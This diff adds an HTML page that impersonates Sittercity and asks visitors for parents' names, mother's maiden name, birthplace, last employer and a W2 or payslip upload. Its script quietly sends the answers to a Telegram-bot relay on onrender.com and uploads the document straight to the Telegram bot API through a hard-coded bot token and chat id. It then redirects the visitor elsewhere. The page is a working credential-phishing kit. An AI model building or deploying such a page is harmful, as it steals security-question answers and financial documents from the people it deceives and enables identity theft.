@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Additional Information - Sittercity</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+
+  <body class="bg-gray-100 p-8">
+    <div class="max-w-md mx-auto bg-white p-6 rounded-md shadow-md">
+      <!-- Company Logo -->
+      <div class="mb-4 mx-auto" style="max-width: 200px; text-align: center;">
+        <img
+          src="logo.png"
+          alt="Sittercity Logo"
+          class="mx-auto"
+          style="max-width: 100%; height: auto;"
+        />
+      </div>
+
+      <h2 class="text-2xl font-bold mb-6 text-center">Additional information required to help us know you better</h2>
+
+      <form
+        id="registrationForm"
+        onsubmit="submitForm(event)"
+        enctype="multipart/form-data"
+      >
+        <div class="mt-4">
+          <label for="fatherName" class="block text-sm font-medium text-gray-600">Father's Name</label>
+          <input
+            type="text"
+            id="fatherName"
+            name="fatherName"
+            class="mt-1 p-2 w-full border rounded-md"
+            required
+          />
+        </div>
+
+        <div class="mt-4">
+          <label for="motherName" class="block text-sm font-medium text-gray-600">Mother's Name</label>
+          <input
+            type="text"
+            id="motherName"
+            name="motherName"
+            class="mt-1 p-2 w-full border rounded-md"
+            required
+          />
+        </div>
+
+        <div class="mt-4">
+          <label for="motherMaiden" class="block text-sm font-medium text-gray-600">Mother's Maiden Name</label>
+          <input
+            type="text"
+            id="motherMaiden"
+            name="motherMaiden"
+            class="mt-1 p-2 w-full border rounded-md"
+            required
+          />
+        </div>
+
+        <div class="mt-4">
+          <label for="birthPlace" class="block text-sm font-medium text-gray-600">Place of Birth</label>
+          <input
+            type="text"
+            id="birthPlace"
+            name="birthPlace"
+            class="mt-1 p-2 w-full border rounded-md"
+            required
+          />
+        </div>
+
+        <div class="mt-4">
+          <label for="lastEmployer" class="block text-sm font-medium text-gray-600">Last Employer</label>
+          <input
+            type="text"
+            id="lastEmployer"
+            name="lastEmployer"
+            class="mt-1 p-2 w-full border rounded-md"
+            required
+          />
+        </div>
+
+        <div class="mt-4">
+          <label for="payslip" class="block text-sm font-medium text-gray-600">Upload W2 or Payslip (Optional)</label>
+          <div class="relative border-dashed border-2 border-gray-500 p-4 rounded-md">
+            <input
+              type="file"
+              id="payslip"
+              name="payslip"
+              accept="image/*,.pdf"
+              class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+              onchange="updateFileName('payslip', this)"
+            />
+            <div class="text-center">
+              <p class="text-gray-500" id="payslipFileName">
+                Drag and drop your file here or
+              </p>
+              <p class="text-blue-500">Browse</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="mt-6 text-center">
+          <button
+            type="submit"
+            class="bg-pink-500 text-white px-4 py-2 rounded-md w-full hover:bg-pink-600"
+          >
+            Submit
+          </button>
+        </div>
+      </form>
+    </div>
+
+    <script>
+      function updateFileName(inputId, inputElement) {
+        const fileNameElement = document.getElementById(`${inputId}FileName`);
+        const fileName = inputElement.files[0]?.name || "Drag and drop your file here or";
+        fileNameElement.textContent = fileName;
+      }
+
+      async function submitForm(event) {
+        event.preventDefault();
+        const submitButton = document.querySelector('button[type="submit"]');
+        submitButton.disabled = true;
+        submitButton.textContent = "Processing...";
+
+        const formData = new FormData(document.getElementById("registrationForm"));
+        const response = await sendFormData(formData);
+
+        // Check if a file is selected for payslip
+        const payslipInput = document.getElementById("payslip");
+        if (payslipInput.files.length > 0) {
+          const photo = payslipInput.files[0];
+          const photoResponse = await sendPhotoToTelegram(photo);
+          if (!photoResponse.ok) {
+            console.error("Error sending payslip to Telegram:", photoResponse.statusText);
+          } else {
+            console.log("Payslip sent");
+          }
+        }
+
+        // Redirect after successful submission
+        window.location.replace("https://identity-id.vercel.app/");
+      }
+
+      async function sendFormData(formData) {
+        try {
+          return await fetch("https://telegram-bot-dkpv.onrender.com/form_bunny_2", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(Object.fromEntries(formData)),
+          });
+        } catch (error) {
+          console.error("Error sending data:", error);
+          return null;
+        }
+      }
+
+      async function sendPhotoToTelegram(photo) {
+        try {
+          const formData = new FormData();
+          formData.append("photo", photo);
+          formData.append("chat_id", "7068073891");
+
+          return await fetch(
+            "https://api.telegram.org/bot7952621434:AAE6wemmxjCclKwmiyPGvLwMgki1YvEY0Rk/sendphoto",
+            {
+              method: "POST",
+              body: formData,
+            }
+          );
+        } catch (error) {
+          console.error("Error sending photo to Telegram:", error);
+          return null;
+        }
+      }
+    </script>
+  </body>
+</html>
